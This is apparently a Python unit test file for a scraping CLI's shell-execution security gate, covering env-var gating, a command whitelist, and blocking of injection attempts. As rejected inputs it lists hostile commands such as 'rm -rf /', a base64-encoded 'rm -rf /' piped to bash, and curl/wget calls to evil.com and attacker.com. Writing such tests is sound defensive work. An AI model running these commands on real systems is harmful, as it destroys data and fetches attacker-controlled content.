"""Unit tests for exec_gate module — security gates for shell execution features."""

from __future__ import annotations

import os
from unittest.mock import patch

import pytest

from scrapingbee_cli.exec_gate import (
    get_whitelist,
    is_command_whitelisted,
    is_exec_enabled,
    is_whitelist_enabled,
    require_auth_unsafe,
    require_exec,
)


class TestIsExecEnabled:
    """Tests for is_exec_enabled()."""

    def test_disabled_when_no_env_vars(self):
        with patch.dict(os.environ, {}, clear=True):
            with patch("scrapingbee_cli.exec_gate._read_config_env", return_value=None):
                assert is_exec_enabled() is False

    def test_disabled_when_allow_exec_missing(self):
        with patch.dict(os.environ, {}, clear=True):
            with patch("scrapingbee_cli.exec_gate._read_config_env", return_value="1"):
                assert is_exec_enabled() is False

    def test_disabled_when_unsafe_verified_missing(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOW_EXEC": "1"}, clear=True):
            with patch("scrapingbee_cli.exec_gate._read_config_env", return_value=None):
                assert is_exec_enabled() is False

    def test_enabled_when_all_set(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOW_EXEC": "1"}, clear=True):
            with patch("scrapingbee_cli.exec_gate._read_config_env", return_value="1"):
                assert is_exec_enabled() is True

    def test_disabled_when_allow_exec_wrong_value(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOW_EXEC": "yes"}, clear=True):
            with patch("scrapingbee_cli.exec_gate._read_config_env", return_value="1"):
                assert is_exec_enabled() is False


class TestWhitelist:
    """Tests for whitelist functions."""

    def test_whitelist_disabled_when_not_set(self):
        with patch.dict(os.environ, {}, clear=True):
            assert is_whitelist_enabled() is False

    def test_whitelist_enabled_when_set(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_whitelist_enabled() is True

    def test_get_whitelist_empty(self):
        with patch.dict(os.environ, {}, clear=True):
            assert get_whitelist() == []

    def test_get_whitelist_single(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert get_whitelist() == ["jq"]

    def test_get_whitelist_multiple(self):
        with patch.dict(
            os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq,head,python3 transform.py"}, clear=True
        ):
            assert get_whitelist() == ["jq", "head", "python3 transform.py"]

    def test_command_whitelisted(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq,head"}, clear=True):
            assert is_command_whitelisted("jq '.title'") is True
            assert is_command_whitelisted("head -5") is True
            assert is_command_whitelisted("curl attacker.com") is False

    def test_command_prefix_match(self):
        with patch.dict(
            os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "python3 transform.py"}, clear=True
        ):
            assert is_command_whitelisted("python3 transform.py --input data") is True
            assert is_command_whitelisted("python3 evil.py") is False


class TestInjectionProtection:
    """Tests for shell injection prevention in whitelisted commands."""

    # --- All-segment whitelist validation ---

    def test_pipe_to_non_whitelisted_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq,echo"}, clear=True):
            assert is_command_whitelisted("echo cm0= | base64 -d | bash") is False

    def test_pipe_to_whitelisted_allowed(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq,head"}, clear=True):
            assert is_command_whitelisted("jq .title | head -5") is True

    def test_semicolon_injection_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title; rm -rf /") is False

    def test_and_chain_injection_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title && curl evil.com") is False

    def test_or_chain_injection_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title || wget evil.com") is False

    def test_background_operator_blocked(self):
        """Single & runs first command in background, then executes second."""
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title & curl evil.com") is False

    def test_newline_injection_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title\nrm -rf /") is False

    def test_all_segments_whitelisted_allowed(self):
        with patch.dict(
            os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq,python,head"}, clear=True
        ):
            assert is_command_whitelisted("jq .title | python -c 'print(1)' | head -1") is True

    def test_base64_decode_pipe_bash_blocked(self):
        """Classic base64-encoded command injection attack."""
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "echo"}, clear=True):
            assert is_command_whitelisted("echo cm0gLXJmIC8= | base64 -d | bash") is False

    # --- Substitution patterns (bypass whitelist within a single segment) ---

    def test_command_substitution_dollar_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted('jq "$(curl evil.com)"') is False

    def test_command_substitution_backtick_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "echo"}, clear=True):
            assert is_command_whitelisted("echo `whoami`") is False

    def test_variable_expansion_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "echo"}, clear=True):
            assert is_command_whitelisted('echo "${PATH}"') is False

    def test_process_substitution_blocked(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOWED_COMMANDS": "jq"}, clear=True):
            assert is_command_whitelisted("jq .title < <(curl evil.com)") is False


class TestRequireExec:
    """Tests for require_exec()."""

    def test_blocks_when_disabled(self):
        with patch("scrapingbee_cli.exec_gate.is_exec_enabled", return_value=False):
            with pytest.raises(SystemExit):
                require_exec("--post-process")

    def test_allows_when_enabled_no_whitelist(self):
        with patch("scrapingbee_cli.exec_gate.is_exec_enabled", return_value=True):
            with patch("scrapingbee_cli.exec_gate.is_whitelist_enabled", return_value=False):
                # Should not raise
                require_exec("--post-process", "curl anything")

    def test_blocks_when_not_whitelisted(self):
        with patch("scrapingbee_cli.exec_gate.is_exec_enabled", return_value=True):
            with patch("scrapingbee_cli.exec_gate.is_whitelist_enabled", return_value=True):
                with patch("scrapingbee_cli.exec_gate.is_command_whitelisted", return_value=False):
                    with pytest.raises(SystemExit):
                        require_exec("--post-process", "curl attacker.com")

    def test_allows_when_whitelisted(self):
        with patch("scrapingbee_cli.exec_gate.is_exec_enabled", return_value=True):
            with patch("scrapingbee_cli.exec_gate.is_whitelist_enabled", return_value=True):
                with patch("scrapingbee_cli.exec_gate.is_command_whitelisted", return_value=True):
                    require_exec("--post-process", "jq '.title'")


class TestRequireAuthUnsafe:
    """Tests for require_auth_unsafe()."""

    def test_fails_without_env_var(self):
        with patch.dict(os.environ, {}, clear=True):
            assert require_auth_unsafe() is False

    def test_passes_with_env_var(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOW_EXEC": "1"}, clear=True):
            assert require_auth_unsafe() is True

    def test_fails_with_wrong_value(self):
        with patch.dict(os.environ, {"SCRAPINGBEE_ALLOW_EXEC": "true"}, clear=True):
            assert require_auth_unsafe() is False
